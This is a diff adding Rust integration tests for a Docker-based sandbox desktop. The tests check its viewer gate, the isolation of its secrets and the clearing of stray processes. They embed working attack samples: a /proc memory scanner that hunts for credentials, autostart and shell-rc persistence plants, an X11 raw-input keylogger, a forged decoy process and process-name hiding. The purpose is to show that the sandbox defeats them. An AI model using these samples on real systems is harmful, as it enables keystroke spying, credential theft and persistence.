@@ -8,7 +8,9 @@
 
 use std::path::PathBuf;
 
-use buwiz_computer::{DockerProvider, Input, Power, Provider, Sleep, Spec};
+use buwiz_computer::{DockerProvider, Gate, Input, Mode, Power, Provider, Screen, Sleep, Spec};
+use tokio::io::{AsyncReadExt, AsyncWriteExt};
+use tokio::net::TcpStream;
 
 const IMAGE_ENV: &str = "BUWIZ_COMPUTER_IMAGE";
 
@@ -244,4 +246,413 @@ async fn lost_and_peers(p: &DockerProvider, a: &buwiz_computer::Machine, b: &buw
     p.destroy(a).await.expect("a volume already gone stopped the removal");
     assert_eq!(docker(&["volume", "ls", "--quiet", "--filter", &format!("name={na}-home")]), "", "the other volume was left behind");
     println!("home alone: found, and a delete removed it");
+}
+
+/// What a page does to reach a ticket's screen: the ticket, then the socket, by the real gate.
+async fn real_socket(gate: &Gate, bot: &str, viewer: buwiz_computer::Viewer, mode: Mode) -> (TcpStream, u16, String, String) {
+    let url = gate.open(bot, viewer, mode).unwrap();
+    let (port, target) = url.strip_prefix("http://127.0.0.1:").unwrap().split_once('/').unwrap();
+    let (port, target) = (port.parse::<u16>().unwrap(), format!("/{target}"));
+    let reply = http(port, &target, "").await;
+    let cookie = reply.lines().find_map(|l| l.strip_prefix("Set-Cookie: ")).unwrap().split(';').next().unwrap().to_owned();
+    let clean = target.split('?').next().unwrap().to_owned();
+    let mut ws = TcpStream::connect(("127.0.0.1", port)).await.unwrap();
+    ws.write_all(format!("GET {clean}ws HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\nCookie: {cookie}\r\nOrigin: http://127.0.0.1:{port}\r\nConnection: Upgrade\r\nUpgrade: websocket\r\nSec-WebSocket-Version: 13\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Extensions: permessage-deflate\r\n\r\n").as_bytes()).await.unwrap();
+    let mut head = Vec::new();
+    let mut byte = [0u8; 1];
+    while !head.ends_with(b"\r\n\r\n") {
+        ws.read_exact(&mut byte).await.unwrap();
+        head.push(byte[0]);
+    }
+    let head = String::from_utf8_lossy(&head).into_owned();
+    assert!(head.starts_with("HTTP/1.1 101"), "{head}");
+    assert!(!head.to_lowercase().contains("sec-websocket-extensions"), "the gate couldn't read that: {head}");
+    (ws, port, clean, cookie)
+}
+
+async fn http(port: u16, target: &str, cookie: &str) -> String {
+    let mut s = TcpStream::connect(("127.0.0.1", port)).await.unwrap();
+    let extra = if cookie.is_empty() { String::new() } else { format!("Cookie: {cookie}\r\n") };
+    s.write_all(format!("GET {target} HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\n{extra}\r\n").as_bytes()).await.unwrap();
+    let mut out = Vec::new();
+    s.read_to_end(&mut out).await.unwrap();
+    String::from_utf8_lossy(&out).into_owned()
+}
+
+fn command(text: &str) -> Vec<u8> {
+    let mask = [7u8, 8, 9, 10];
+    let mut out = vec![0x81, 0x80 | text.len() as u8];
+    out.extend(mask);
+    out.extend(text.bytes().enumerate().map(|(i, b)| b ^ mask[i % 4]));
+    out
+}
+
+async fn pointer(p: &DockerProvider, m: &buwiz_computer::Machine, screen: &Screen) -> String {
+    tokio::time::sleep(std::time::Duration::from_millis(400)).await;
+    let out = p.run(m, screen, "xdotool getmouselocation --shell | head -2 | tr '\\n' ' '", 5000).await.unwrap();
+    assert_eq!(out.exit_code, Some(0), "{}", out.stderr);
+    out.stdout.trim().to_owned()
+}
+
+/// The real viewer, through the real gate: only the gate stands between a watcher and the desktop.
+#[tokio::test(flavor = "multi_thread")]
+#[ignore = "needs Docker and the computer image"]
+async fn a_watcher_cant_touch_a_real_screen_and_a_driver_can() {
+    let image = std::env::var(IMAGE_ENV).unwrap_or_else(|_| "buwiz-computer:local".to_owned());
+    let dir: PathBuf = std::env::temp_dir().join(format!("c2w-{}", std::process::id()));
+    std::fs::create_dir_all(&dir).unwrap();
+    let p = DockerProvider::new(image.clone(), "c2w");
+    p.check().await.unwrap_or_else(|e| panic!("this test needs Docker and the image: {e}"));
+    let m = p.create(&Spec { id: "cmp_c2wtest".into(), dir: dir.clone() }).await.unwrap();
+    let outcome = tokio::spawn({
+        let m = m.clone();
+        async move { watch_and_drive(&DockerProvider::new(image, "c2w"), &m).await }
+    })
+    .await;
+    p.destroy(&m).await.unwrap();
+    let _ = std::process::Command::new("docker").args(["network", "rm", "c2w-net"]).output();
+    let _ = std::fs::remove_dir_all(&dir);
+    outcome.unwrap();
+}
+
+async fn watch_and_drive(p: &DockerProvider, m: &buwiz_computer::Machine) {
+    p.wake(m).await.unwrap();
+    let a = p.screen_up(m, "c2w_a").await.unwrap();
+    let b = p.screen_up(m, "c2w_b").await.unwrap();
+    let gate = Gate::start().await.unwrap();
+    let quiet = std::time::Duration::from_secs(2);
+    let (a_viewer, b_viewer) = (p.viewer(m, &a).await.unwrap().unwrap(), p.viewer(m, &b).await.unwrap().unwrap());
+
+    p.input(m, &a, &Input::Move { x: 40, y: 40 }).await.unwrap();
+    p.input(m, &b, &Input::Move { x: 41, y: 41 }).await.unwrap();
+    let (at_start, b_at_start) = (pointer(p, m, &a).await, pointer(p, m, &b).await);
+    println!("before: {at_start} / {b_at_start}");
+    assert!(at_start.contains("X=40") && b_at_start.contains("X=41"), "{at_start} {b_at_start}");
+
+    let (mut ws, port, clean, cookie) = real_socket(&gate, "c2w_a", a_viewer.clone(), Mode::Watch).await;
+    for path in ["", "client.js", "worker.js", "audio.js", "mic.js", "inter.woff2", "favicon.ico"] {
+        let page = http(port, &format!("{clean}{path}"), &cookie).await;
+        assert!(page.starts_with("HTTP/1.1 200"), "{path}: {}", page.lines().next().unwrap_or_default());
+    }
+    for path in ["screenshot", "stats", "wait?idle=1", "files/list"] {
+        assert!(http(port, &format!("{clean}{path}"), &cookie).await.starts_with("HTTP/1.1 403"), "{path}");
+    }
+    ws.write_all(&command("m,300,200")).await.unwrap();
+    ws.write_all(&command("b,1,1")).await.unwrap();
+    ws.write_all(&command("b,1,0")).await.unwrap();
+    ws.write_all(&command("po,1")).await.unwrap();
+    assert_eq!(pointer(p, m, &a).await, at_start, "a watcher moved the real pointer");
+    assert!(!gate.driving("c2w_a", quiet));
+
+    let (mut ws, ..) = real_socket(&gate, "c2w_a", a_viewer, Mode::Drive).await;
+    assert!(gate.driving("c2w_a", quiet), "an open drive viewer counts as a person from the start");
+    ws.write_all(&command("m,300,200")).await.unwrap();
+    let driven = pointer(p, m, &a).await;
+    println!("driven: {driven}");
+    assert!(driven.contains("X=300") && driven.contains("Y=200"), "a driver's input didn't reach the desktop: {driven}");
+    assert_eq!(pointer(p, m, &b).await, b_at_start, "another Bot's screen moved");
+    assert!(gate.driving("c2w_a", std::time::Duration::from_secs(30)), "the gate didn't see them");
+    assert!(!gate.driving("c2w_b", std::time::Duration::from_secs(30)));
+
+    // another Bot's ticket is another Bot's: it reaches its own screen and no other
+    let (mut other, ..) = real_socket(&gate, "c2w_b", b_viewer, Mode::Drive).await;
+    other.write_all(&command("m,100,120")).await.unwrap();
+    assert!(pointer(p, m, &b).await.contains("X=100"));
+    assert!(pointer(p, m, &a).await.contains("X=300"));
+
+    // gone from the gate, gone from the viewer
+    gate.close("c2w_a");
+    drop(ws);
+    for _ in 0..200 {
+        if !gate.driving("c2w_a", std::time::Duration::from_secs(30)) {
+            return;
+        }
+        tokio::time::sleep(std::time::Duration::from_millis(10)).await;
+    }
+    panic!("a closed session still counts as driving");
+}
+
+/// Hunts for `needle` (read from a file, so it's on no command line) in every process it can read,
+/// and tries the viewers with no password. What it prints names no secret.
+const HUNT: &str = r#"
+import glob, os, re, socket, sys
+needles = [l.strip().encode() for l in open(sys.argv[1]) if l.strip()]
+os.remove(sys.argv[1])
+me = {os.getpid(), os.getppid()}
+for p in ['/run/buwiz-computer/viewer', '/run/buwiz-computer/token']:
+    try:
+        print(p, 'READ', len(open(p).read()))
+    except Exception as e:
+        print(p, 'unreadable', type(e).__name__)
+print('dir', os.path.isdir('/run/buwiz-computer') and sorted(os.listdir('/run/buwiz-computer')))
+for pid in sorted(int(d) for d in os.listdir('/proc') if d.isdigit()):
+    if pid in me:
+        continue
+    for name in ['environ', 'cmdline']:
+        try:
+            data = open(f'/proc/{pid}/{name}', 'rb').read()
+            if any(n in data for n in needles):
+                print('FOUND', pid, name)
+        except Exception:
+            pass
+    try:
+        maps = open(f'/proc/{pid}/maps').read().splitlines()
+        mem = open(f'/proc/{pid}/mem', 'rb', 0)
+    except Exception:
+        continue
+    for line in maps:
+        lo, hi = [int(x, 16) for x in line.split()[0].split('-')]
+        if 'r' not in line.split()[1] or hi - lo > 1 << 28:
+            continue
+        try:
+            mem.seek(lo)
+            data = mem.read(hi - lo)
+            if any(n in data for n in needles):
+                print('FOUND', pid, 'mem', open(f'/proc/{pid}/comm').read().strip())
+                break
+        except Exception:
+            pass
+for port in sys.argv[2:]:
+    for path, extra in [('/', ''), ('/screenshot', ''), ('/ws', 'Connection: Upgrade\r\nUpgrade: websocket\r\nSec-WebSocket-Version: 13\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n')]:
+        s = socket.create_connection(('127.0.0.1', int(port)), 3)
+        s.sendall(f'GET {path} HTTP/1.1\r\nHost: 127.0.0.1\r\n{extra}\r\n'.encode())
+        s.settimeout(3)
+        print('port', port, path, s.recv(64).split(b'\r\n')[0].decode(errors='replace'))
+"#;
+
+/// What a planted autostart would do at a start: read the staged files as fast as it can.
+const EARLY: &str = "import os,time\nout=open('/workspace/c2early.log','a')\nout.write('began %.3f\\n'%time.time());out.flush()\nend=time.time()+20\nhit=0\nseen=0\nn=0\nwhile time.time()<end:\n    n+=1\n    for p in ['/run/buwiz-computer/viewer','/run/buwiz-computer/token']:\n        try:\n            if os.path.exists(p):\n                seen+=1\n            d=open(p).read()\n            if d:\n                hit+=1\n                out.write('READ '+p+' '+str(len(d))+' after '+str(n)+'\\n');out.flush()\n        except Exception as e:\n            pass\n    time.sleep(0.002)\nout.write('done hits='+str(hit)+' seen='+str(seen)+' tries='+str(n)+'\\n');out.close()\n";
+
+/// From inside, as `computer_run` is: the secrets can't be read, by file or from any process, and
+/// the viewers answer nothing without them. Not at a start either, for something planted to run then.
+#[tokio::test(flavor = "multi_thread")]
+#[ignore = "needs Docker and the computer image"]
+async fn a_box_process_cant_get_the_viewer_password_or_past_the_viewer() {
+    let image = std::env::var(IMAGE_ENV).unwrap_or_else(|_| "buwiz-computer:local".to_owned());
+    let dir: PathBuf = std::env::temp_dir().join(format!("c2s-{}", std::process::id()));
+    std::fs::create_dir_all(&dir).unwrap();
+    let p = DockerProvider::new(image.clone(), "c2s");
+    p.check().await.unwrap_or_else(|e| panic!("this test needs Docker and the image: {e}"));
+    let m = p.create(&Spec { id: "cmp_c2stest".into(), dir: dir.clone() }).await.unwrap();
+    let outcome = tokio::spawn({
+        let m = m.clone();
+        async move { hunt(&DockerProvider::new(image, "c2s"), &m).await }
+    })
+    .await;
+    p.destroy(&m).await.unwrap();
+    let _ = std::process::Command::new("docker").args(["network", "rm", "c2s-net"]).output();
+    let _ = std::fs::remove_dir_all(&dir);
+    outcome.unwrap();
+}
+
+async fn hunt(p: &DockerProvider, m: &buwiz_computer::Machine) {
+    p.wake(m).await.unwrap();
+    let a = p.screen_up(m, "c2s_a").await.unwrap();
+    let control = "c2s-control-value-held-in-memory";
+    let needles = format!("{}\n{}\n{control}\n", m.viewer_password.expose(), m.token.expose());
+    p.write_file(m, "needles", needles.as_bytes()).await.unwrap();
+    // the hunt must be able to find what's there: an ordinary process holds this, built at run time
+    let holder = r#"setsid nohup python3 -c "x='c2s-control-'+'value-held-in-memory'.strip();import time;time.sleep(60)" >/dev/null 2>&1 &"#;
+    assert_eq!(p.run(m, &a, holder, 5000).await.unwrap().exit_code, Some(0));
+    tokio::time::sleep(std::time::Duration::from_millis(500)).await;
+    let quoted = HUNT.replace('\'', "'\\''");
+    let out = p.run(m, &a, &format!("python3 -c '{quoted}' /workspace/needles 6901 {}", a.viewer_port), 60_000).await.unwrap();
+    println!("the hunt:\n{}\n{}", out.stdout, out.stderr);
+    assert_eq!(out.exit_code, Some(0), "{}", out.stderr);
+    let found: Vec<&str> = out.stdout.lines().filter(|l| l.starts_with("FOUND")).collect();
+    assert_eq!(found.len(), 1, "one find, the control's: {found:?}");
+    assert!(found[0].contains("python3"), "the hunt can't read memory, or found a secret: {found:?}");
+    let tree = p.run(m, &a, "ps -eo pid,ppid,pgid,sid,uid,comm,args --forest | cut -c1-120", 5000).await.unwrap().stdout;
+    println!("{tree}");
+    assert!(!out.stdout.contains(" READ "), "a secret can be read from its file");
+    let ports: Vec<&str> = out.stdout.lines().filter(|l| l.starts_with("port ")).collect();
+    assert_eq!(ports.len(), 6, "{}", out.stdout);
+    for line in ports {
+        assert!(line.contains(" 401"), "a viewer answered with no password: {line}");
+    }
+
+    // planted to run at a start, in every place a start reads from the home that outlives it
+    let plant = format!(
+        r#"mkdir -p ~/.config/autostart; printf '%s\n' '[Desktop Entry]' 'Type=Application' 'Name=c2early' 'Exec=python3 /home/box/c2early.py' > ~/.config/autostart/c2early.desktop; printf '%s\n' {script} > ~/c2early.py; printf 'python3 /home/box/c2early.py &\n' | tee -a ~/.bashrc ~/.profile ~/.xsessionrc >/dev/null"#,
+        script = shell_lines(EARLY),
+    );
+    assert_eq!(p.run(m, &a, &plant, 10_000).await.unwrap().exit_code, Some(0));
+    p.sleep(m, Sleep::Deep).await.unwrap();
+    let began = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_secs_f64();
+    p.wake(m).await.unwrap();
+    let woke = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_secs_f64();
+    println!("wake began {began:.3}, secrets gone by {woke:.3}");
+    p.screen_up(m, "c2s_a").await.unwrap();
+    let mut log = String::new();
+    for _ in 0..60 {
+        log = p.run(m, &a, "cat /workspace/c2early.log 2>/dev/null", 5000).await.unwrap().stdout;
+        if log.contains("done") {
+            break;
+        }
+        tokio::time::sleep(std::time::Duration::from_millis(500)).await;
+    }
+    println!("planted at a start:\n{log}");
+    assert!(log.contains("done"), "the planted reader never ran: {log}");
+    assert!(!log.contains("READ"), "something planted read a staged secret at a start: {log}");
+}
+
+/// A keylogger as a command could leave one: XInput2 raw key events on the root, over the X socket.
+const KEYLOGGER: &str = r#"
+import socket, struct, sys, time
+log = open(sys.argv[2], 'a', buffering=1)
+s = socket.socket(socket.AF_UNIX); s.connect('/tmp/.X11-unix/X' + sys.argv[1].lstrip(':'))
+s.sendall(struct.pack('<BxHHHHxx', 0x6c, 11, 0, 0, 0))
+def rd(n):
+    b = b''
+    while len(b) < n:
+        c = s.recv(n - len(b))
+        if not c:
+            sys.exit(0)
+        b += c
+    return b
+h = rd(8); d = rd(struct.unpack('<H', h[6:8])[0] * 4)
+root = struct.unpack('<I', d[32 + ((struct.unpack('<H', d[16:18])[0] + 3) & ~3) + 8 * d[21]:][:4])[0]
+name = b'XInputExtension'; pad = (-len(name)) % 4
+s.sendall(struct.pack('<BxHHxx', 98, 2 + (len(name) + pad) // 4, len(name)) + name + b'\0' * pad)
+major = rd(32)[9]
+s.sendall(struct.pack('<BBHHH', major, 47, 2, 2, 2)); rd(32)
+s.sendall(struct.pack('<BBHIHxx', major, 46, 5, root, 1) + struct.pack('<HH', 1, 1) + struct.pack('<I', 1 << 13))
+log.write('ready\n')
+while True:
+    e = rd(32)
+    if e[0] == 35:
+        extra = struct.unpack('<I', e[4:8])[0]
+        if extra:
+            rd(extra * 4)
+        log.write('key %d\n' % struct.unpack('<I', e[16:20])[0])
+"#;
+
+/// Starts `box-keeper` as the box user at pid `argv[1]`, under pid 1, blocked on a fifo.
+const DECOY: &str = r#"
+import ctypes, os, signal, struct, sys
+os.mkfifo('/tmp/decoy.fifo', 0o666)
+pid = int(sys.argv[1])
+tid = (ctypes.c_int32 * 1)(pid)
+args = struct.pack('=11Q', 0, 0, 0, 0, signal.SIGCHLD, 0, 0, 0, ctypes.addressof(tid), 1, 0)
+libc = ctypes.CDLL(None, use_errno=True)
+keep = os.fork()
+if keep:
+    os.waitpid(keep, 0)
+    print('decoy', pid if open('/tmp/decoy.ok').read() == 'ok' else 'failed')
+    sys.exit(0)
+got = libc.syscall(435, ctypes.c_char_p(args), len(args))
+if got > 0:
+    open('/tmp/decoy.ok', 'w').write('ok')
+    os._exit(0)
+if got < 0:
+    open('/tmp/decoy.ok', 'w').write('errno %d' % ctypes.get_errno())
+    os._exit(1)
+if got == 0:
+    # or `docker exec` waits on these for as long as it blocks
+    null = os.open('/dev/null', os.O_RDWR)
+    for fd in (0, 1, 2):
+        os.dup2(null, fd)
+    os.setgroups([])
+    os.setgid(1000)
+    os.setuid(1000)
+    os.setsid()
+    os.execve('/usr/local/bin/box-keeper', ['box-keeper'], {'BOX_TOKEN_FILE': '/tmp/decoy.fifo', 'HOME': '/home/box', 'PATH': '/usr/bin:/bin'})
+"#;
+
+/// What a hand-over clears: what commands left, wherever it hides, and none of the desktop.
+#[tokio::test(flavor = "multi_thread")]
+#[ignore = "needs Docker and the computer image"]
+async fn clearing_ends_what_commands_left_and_spares_the_desktop() {
+    let image = std::env::var(IMAGE_ENV).unwrap_or_else(|_| "buwiz-computer:local".to_owned());
+    let dir: PathBuf = std::env::temp_dir().join(format!("c2k-{}", std::process::id()));
+    std::fs::create_dir_all(&dir).unwrap();
+    let p = DockerProvider::new(image.clone(), "c2k");
+    p.check().await.unwrap_or_else(|e| panic!("this test needs Docker and the image: {e}"));
+    let m = p.create(&Spec { id: "cmp_c2ktest".into(), dir: dir.clone() }).await.unwrap();
+    let outcome = tokio::spawn({
+        let m = m.clone();
+        async move { clear(&DockerProvider::new(image, "c2k"), &m).await }
+    })
+    .await;
+    docker(&["rm", "-f", &format!("{}-helper", name_of(&m))]);
+    p.destroy(&m).await.unwrap();
+    let _ = std::process::Command::new("docker").args(["network", "rm", "c2k-net"]).output();
+    let _ = std::fs::remove_dir_all(&dir);
+    outcome.unwrap();
+}
+
+async fn clear(p: &DockerProvider, m: &buwiz_computer::Machine) {
+    p.wake(m).await.unwrap();
+    let a = p.screen_up(m, "c2k_a").await.unwrap();
+    // something planted to start with the desktop, under its session: spared by nothing
+    let plant = "mkdir -p ~/.config/autostart; printf '%s\\n' '[Desktop Entry]' 'Type=Application' 'Name=c2plant' 'Exec=python3 -c \"import time;time.sleep(600)\"' > ~/.config/autostart/c2plant.desktop";
+    assert_eq!(p.run(m, &a, plant, 5000).await.unwrap().exit_code, Some(0));
+    p.sleep(m, Sleep::Deep).await.unwrap();
+    p.wake(m).await.unwrap();
+    let a = p.screen_up(m, "c2k_a").await.unwrap();
+    p.run(m, &a, "rm ~/.config/autostart/c2plant.desktop", 5000).await.unwrap();
+    p.open_url(m, &a, "http://127.0.0.1:1/").await.unwrap();
+    tokio::time::sleep(std::time::Duration::from_secs(3)).await;
+
+    p.write_file(m, "kl.py", KEYLOGGER.as_bytes()).await.unwrap();
+    let left = format!(
+        "setsid nohup python3 /workspace/kl.py {} /workspace/keys.log >/dev/null 2>&1 & setsid nohup sh -c 'while true; do sleep 0.05 & done' >/dev/null 2>&1 & VOXL_PASSWORD=$(head -c 24 /dev/urandom | od -An -tx1 | tr -d ' \\n') DISPLAY={} setsid nohup voxl --addr=127.0.0.1 --port=7000 >/dev/null 2>&1 & cp /usr/bin/python3 /workspace/innocent; setsid nohup /workspace/innocent -c 'import time;time.sleep(600)' >/dev/null 2>&1 &",
+        a.display, a.display
+    );
+    assert_eq!(p.run(m, &a, &left, 5000).await.unwrap().exit_code, Some(0));
+    tokio::time::sleep(std::time::Duration::from_secs(1)).await;
+    // a name that isn't text, and a process /proc says is root's: neither stops the scan or hides
+    let hiding = "import ctypes,os,sys,time\nlibc=ctypes.CDLL(None)\nif sys.argv[1]=='name':\n    libc.prctl(15,b'\\xff\\xfe\\x80bad',0,0,0)\nelse:\n    libc.prctl(4,0,0,0,0)\nopen('/workspace/'+sys.argv[1]+'.pid','w').write(str(os.getpid()))\ntime.sleep(600)\n";
+    p.write_file(m, "hiding.py", hiding.as_bytes()).await.unwrap();
+    assert_eq!(p.run(m, &a, "setsid nohup python3 /workspace/hiding.py name >/dev/null 2>&1 & setsid nohup python3 /workspace/hiding.py undumpable >/dev/null 2>&1 &", 5000).await.unwrap().exit_code, Some(0));
+    // a decoy keeper with a lower pid than the real one. Nothing in the box can get one: seccomp
+    // refuses `clone3`, and pids wrap to 300. So a helper in the box's pid namespace plants it, to
+    // show the scan goes by what can't be forged. What runs is the box user's, blocked on a fifo
+    let helper = format!("{}-helper", name_of(m));
+    let image = std::env::var(IMAGE_ENV).unwrap_or_else(|_| "buwiz-computer:local".to_owned());
+    docker(&["run", "-d", "--rm", "--name", &helper, "--pid", &format!("container:{}", name_of(m)), "--network", "none", "--privileged", "--security-opt", "seccomp=unconfined", "--user", "0", "--entrypoint", "sleep", &image, "120"]);
+    let keeper_pid: u32 = docker(&["exec", "--user", "0", &helper, "sh", "-c", "for p in $(pgrep -x box-keeper); do [ \"$(awk '{print $4}' /proc/$p/stat)\" = 1 ] && echo $p; done"]).parse().unwrap();
+    let low = keeper_pid - 1;
+    let planted = docker(&["exec", "--user", "0", &helper, "/usr/bin/python3", "-I", "-S", "-c", DECOY, &low.to_string()]);
+    assert_eq!(planted, format!("decoy {low}"), "the decoy never got its pid");
+    tokio::time::sleep(std::time::Duration::from_millis(300)).await;
+    let seen = docker(&["exec", "--user", "0", "--privileged", &name_of(m), "sh", "-c", &format!("readlink /proc/{low}/exe; awk '{{print $4}}' /proc/{low}/stat; grep '^Uid' /proc/{low}/status")]);
+    println!("real keeper {keeper_pid}; the decoy at {low}, as the box sees it: {seen:?}");
+    assert!(seen.starts_with("/usr/local/bin/box-keeper\n1\nUid:\t1000"), "the decoy isn't one: {seen}");
+    let before = p.run(m, &a, "ps -eo pid,ppid,comm --forest | cut -c1-70", 5000).await.unwrap().stdout;
+    println!("before:\n{before}");
+
+    let gate = Gate::start().await.unwrap();
+    let (mut ws, ..) = real_socket(&gate, "c2k_a", p.viewer(m, &a).await.unwrap().unwrap(), Mode::Drive).await;
+    let keys = async || p.read_file(m, "keys.log").await.map(|b| String::from_utf8_lossy(&b).matches("key ").count()).unwrap_or(0);
+    ws.write_all(&command("k,97,1")).await.unwrap();
+    ws.write_all(&command("k,97,0")).await.unwrap();
+    tokio::time::sleep(std::time::Duration::from_millis(500)).await;
+    assert_eq!(keys().await, 1, "the keylogger must work, or this proves nothing");
+
+    let ended = p.clear_strays(m).await.unwrap();
+    println!("ended: {ended:?}");
+    assert!(!ended.iter().any(|n| n == "box-active-tab"), "the browser's own helper went: {ended:?}");
+    assert!(ended.iter().any(|n| n == "box-keeper"), "the decoy was spared: {ended:?}");
+    let gone = format!("for f in name undumpable; do test -d /proc/$(cat /workspace/$f.pid) && echo $f survived; done; test -d /proc/{low} && echo decoy survived; true");
+    let survived = p.run(m, &a, &gone, 5000).await.unwrap().stdout;
+    assert_eq!(survived.trim(), "", "hidden from the scan");
+    let after = p.run(m, &a, "ps -eo pid,ppid,comm,args --forest | cut -c1-100", 5000).await.unwrap().stdout;
+    println!("after:\n{after}");
+    for word in ["kl.py", "innocent", "--port=7000", "time.sleep(600)", "sleep 0.05"] {
+        assert!(!after.contains(word), "{word} survived:\n{after}");
+    }
+    for word in ["box-keeper", "box-exec", "box-host", "--port=6901", "--port=6902", "xfce4-session", "xfwm4", "xfce4-panel", "/usr/lib/chromium/chromium", "Xvfb :1", "Xvfb :2"] {
+        assert!(after.contains(word), "{word} went:\n{after}");
+    }
+
+    // the person types: nothing hears it, then or later; the desktop is still theirs
+    ws.write_all(&command("k,98,1")).await.unwrap();
+    ws.write_all(&command("k,98,0")).await.unwrap();
+    ws.write_all(&command("m,222,111")).await.unwrap();
+    assert!(pointer(p, m, &a).await.contains("X=222"), "the person's input stopped reaching the desktop");
+    assert_eq!(keys().await, 1, "a key was logged after the clearing");
+    assert!(p.screenshot(m, &a).await.is_ok());
+    assert_eq!(p.clear_strays(m).await.unwrap(), Vec::<String>::new(), "a second pass finds nothing: the desktop isn't a stray");
+    assert_ne!(p.run(m, &a, "pgrep -c chromium", 5000).await.unwrap().stdout.trim(), "0", "the browser went");
 }
